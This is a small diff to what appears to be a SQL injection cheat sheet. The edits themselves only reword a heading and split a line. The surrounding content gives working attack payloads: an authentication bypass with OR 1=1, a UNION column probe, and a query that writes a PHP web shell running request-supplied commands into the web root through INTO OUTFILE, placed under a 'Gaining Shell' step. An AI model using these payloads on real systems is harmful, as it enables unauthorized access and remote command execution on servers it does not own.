@@ -20,7 +20,7 @@ SELECT * FROM users WHERE username = '' OR 1=1--' AND password = ''
 
 ```
 
-* Getting Shell
+* Gaining Shell
 
 First check the number of column with NULL or 1
 
@@ -33,7 +33,8 @@ SELECT * FROM users WHERE username = 'a' UNION SELECT NULL, NULL; --' AND passwo
 Use the INTO FILE to create a php file in the web server
 
 ```
-SELECT * FROM users WHERE username = 'a' UNION SELECT “<? system($_REQUEST[‘cmd’]); ?>”, NULL; INTO OUTFILE 'var/www/cmd.php'--' AND password = ''
+SELECT * FROM users WHERE username = 'a' 
+UNION SELECT “<? system($_REQUEST[‘cmd’]); ?>”, NULL; INTO OUTFILE 'var/www/cmd.php'--' AND password = ''
 ```
 
 Access the web page 
